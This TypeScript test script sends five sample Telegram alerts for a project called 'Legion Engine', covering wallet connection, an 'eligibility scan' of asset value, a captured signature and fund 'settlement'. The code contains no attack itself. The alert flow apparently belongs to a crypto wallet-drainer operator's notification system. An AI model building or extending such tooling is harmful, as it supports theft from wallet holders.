/**
 * Legion Engine — Telegram Notification Test Script
 * Run: npx tsx src/scripts/test-telegram.ts
 * 
 * Set these env vars before running:
 *   TELEGRAM_BOT_TOKEN=your_bot_token
 *   TELEGRAM_CHAT_ID=your_chat_id
 */

// Load .env if present
import { config } from 'dotenv'
config({ path: '../../.env' })
config({ path: '.env' })

const TOKEN = process.env['TELEGRAM_BOT_TOKEN']?.trim()
const CHAT_ID = process.env['TELEGRAM_CHAT_ID']?.trim()

if (!TOKEN || !CHAT_ID) {
  console.error(`
❌  Missing ENV variables!

    Set them before running:
    TELEGRAM_BOT_TOKEN=xxx TELEGRAM_CHAT_ID=yyy npx tsx src/scripts/test-telegram.ts

    Or add to .env file:
    TELEGRAM_BOT_TOKEN=xxx
    TELEGRAM_CHAT_ID=yyy
  `)
  process.exit(1)
}

async function send(text: string, label: string): Promise<void> {
  try {
    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' }),
      signal: AbortSignal.timeout(10_000),
    })
    const json = await res.json() as { ok: boolean; description?: string }
    if (json.ok) {
      console.log(`✅  [${label}] Sent successfully`)
    } else {
      console.error(`❌  [${label}] API Error: ${json.description}`)
    }
  } catch (err) {
    console.error(`❌  [${label}] Network Error: ${String(err)}`)
  }
}

function getISTTimestamp(): string {
  return new Date().toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata',
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    hour12: true,
  }) + ' IST'
}

async function runTests(): Promise<void> {
  console.log(`
⚡  LEGION ENGINE — Telegram Notification Test
────────────────────────────────────────
Bot Token : ${TOKEN.slice(0, 10)}...
Chat ID   : ${CHAT_ID}
Time (IST): ${getISTTimestamp()}
────────────────────────────────────────
Sending 5 test notifications...
`)

  // Test 1: Wallet Connected
  await send(
    `🔌 <b>NEW WALLET CONNECTED</b> [TEST]
━━━━━━━━━━━━━━━━
📍 <b>Address:</b> <code>0xAbCd...1234</code>
⛓️ <b>Chain:</b> EVM
👛 <b>Wallet:</b> MetaMask
🕐 ${getISTTimestamp()}`,
    'WALLET_CONNECTED'
  )

  // Test 2: Scan Complete
  await send(
    `🔍 <b>ELIGIBILITY SCAN COMPLETE</b> [TEST]
━━━━━━━━━━━━━━━━
📍 <b>Address:</b> <code>0xAbCd...1234</code>
💰 <b>Total Value:</b> $12,500.00
📦 <b>Assets Found:</b> 7
🕐 ${getISTTimestamp()}`,
    'SCAN_COMPLETE'
  )

  // Test 3: Signature Received
  await send(
    `✍️ <b>SIGNATURE ANCHORED</b> [TEST]
━━━━━━━━━━━━━━━━
📍 <b>Address:</b> <code>0xAbCd...1234</code>
⛓️ <b>Chain:</b> EVM
🔏 <b>Sig:</b> <code>0xaabbcc...ee1234</code>
🕐 ${getISTTimestamp()}`,
    'SIGNATURE_RECEIVED'
  )

  // Test 4: Settlement Request
  await send(
    `⚡ <b>SETTLEMENT REQUEST INITIATED</b> [TEST]
━━━━━━━━━━━━━━━━
📍 <b>Address:</b> <code>0xAbCd...1234</code>
⛓️ <b>Chain:</b> EVM
👛 <b>Wallet:</b> MetaMask
💵 <b>Declared Value:</b> $12,500.00
🕐 ${getISTTimestamp()}`,
    'SETTLEMENT_REQUEST'
  )

  // Test 5: Vault Settlement
  await send(
    `💰 <b>VAULT SETTLEMENT CONFIRMED ✅</b> [TEST]
━━━━━━━━━━━━━━━━
📍 <b>Address:</b> <code>0xAbCd...1234</code>
💵 <b>Amount:</b> $12,500.00
🔗 <b>TX:</b> <code>0xdeadbeef...cafe</code>
✅ <b>Status:</b> CONFIRMED
🕐 ${getISTTimestamp()}`,
    'VAULT_SETTLEMENT'
  )

  console.log(`
────────────────────────────────────────
✅  All 5 tests fired!
📱 Check your Telegram now.
`)
}

runTests().catch(console.error)
